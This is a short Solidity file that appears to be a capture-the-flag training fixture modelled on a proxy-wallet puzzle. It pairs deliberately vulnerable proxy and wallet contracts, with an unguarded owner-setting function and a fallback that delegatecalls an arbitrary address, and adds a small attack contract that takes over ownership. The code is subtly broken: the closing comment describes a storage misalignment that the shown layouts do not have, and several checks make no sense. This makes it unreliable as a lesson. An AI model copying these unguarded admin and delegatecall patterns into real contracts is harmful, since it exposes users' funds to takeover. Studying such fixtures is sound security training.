// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract PuzzleProxy {
    address public owner;
    uint256 public maxBalance;
    address public pendingAdmin;

    constructor(address initialAdmin) {
        owner = initialAdmin;
    }

    function proposeNewAdmin(address newAdmin) external {
        // No guard in the original puzzle: writes slot 0 (owner) directly.
        owner = newAdmin;
    }

    function approveNewAdmin(address newAdmin) external {
        pendingAdmin = newAdmin;
    }

    function setMaxBalance(uint256 _maxBalance) external {
        require(address(uint160(maxBalance)) == msg.sender, "not authorized");
        maxBalance = _maxBalance;
    }

    fallback() external payable {
        (bool ok,) = pendingAdmin.delegatecall(msg.data);
        require(ok, "delegatecall failed");
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function setMaxBalance(uint256 _maxBalance) external {
        require(whitelisted[msg.sender], "not whitelisted");
        maxBalance = _maxBalance;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable {
        require(balances[msg.sender] >= value, "insufficient balance");
        balances[msg.sender] -= value;
        (bool ok,) = to.call{value: value}(data);
        require(ok, "execution failed");
    }

    function whitelist(address who) external {
        require(msg.sender == owner, "not owner");
        whitelisted[who] = true;
    }

    function multicall(bytes[] calldata data) external payable {
        for (uint256 i = 0; i < data.length; i++) {
            (bool ok,) = address(this).delegatecall(data[i]);
            require(ok, "call failed");
        }
    }
}

contract PuzzleAttack {
    function attack(PuzzleProxy proxy, address player) external {
        proxy.proposeNewAdmin(player);
    }
}

// Local training fixture: the proxy storage layout (owner, maxBalance) is
// misaligned with the wallet's (owner, maxBalance, whitelisted, balances),
// so admin changes can be tricked into whitelisting an address.

